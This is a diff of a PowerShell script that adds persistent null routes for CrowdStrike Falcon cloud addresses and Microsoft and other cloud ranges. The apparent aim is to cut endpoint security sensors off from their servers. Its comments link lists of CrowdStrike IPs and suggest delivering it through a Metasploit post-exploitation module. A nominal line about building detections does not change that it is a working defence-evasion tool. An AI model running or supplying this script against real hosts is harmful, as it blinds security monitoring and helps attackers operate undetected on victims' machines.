@@ -3,7 +3,7 @@
 # You'll also need to add your own addresses for other VPNs, but all-in-all it's really easy to work, and verified to work. 
 # Test on your own network to build detections w/ whatever EDR toolsets you have.  Powershell vs. route methods work.
 # Use with metasploit: modules/post/windows/manage/exec_powershell.rb
-
+#This is to check if you read the crap you run. But disable IPv6 if you want to kill Microsoft, it uses IPv6 as a fallback
 
 #CS IP Links https://www.dell.com/support/kbdoc/en-lv/000177899/crowdstrike-falcon-sensor-system-requirements
 #CS IP Links https://github.com/simonsigre/crowdstrike_falcon-ipaddresses/blob/master/cs_falcon_commercial_cloud
@@ -37,6 +37,13 @@ route /f
 $InterfaceIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $InterfaceAlias}).InterfaceIndex
 $PanIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $Iface_n}).InterfaceIndex
 
+
+$IPs | ForEach-Object{
+        $meesa = $_ + "/32"
+        $meesa
+        route add -p $_ mask 255.255.255.255 0.0.0.0 if $InterfaceIndex[0]
+}
+            
 route add -p 10.0.0.0 mask 255.0.0.0 0.0.0.0 if $PanIndex[0]
 route add -p 172.16.0.0 mask 255.240.0.0 0.0.0.0 if $PanIndex[0]
 route add -p 192.168.0.0 mask 255.255.0.0 0.0.0.0 if $PanIndex[0]
@@ -47,11 +54,4 @@ route add -p 52.160.0.0 mask 255.224.0.0 0.0.0.0 if $InterfaceIndex[0]
 route add -p 20.0.0.0 mask 255.0.0.0 0.0.0.0 if $InterfaceIndex[0]
 route add -p 35.0.0.0 mask 255.0.0.0 0.0.0.0 if $InterfaceIndex[0]
 
-$IPs | ForEach-Object{
-        $meesa = $_ + "/32"
-        $meesa
-        route add -p $_ mask 255.255.255.255 0.0.0.0 if $InterfaceIndex[0]
-}
-            
-
-#This is to check if you read the crap you run. But disable IPv6 if you want to kill Microsoft, it uses IPv6 as a fallback.
+.
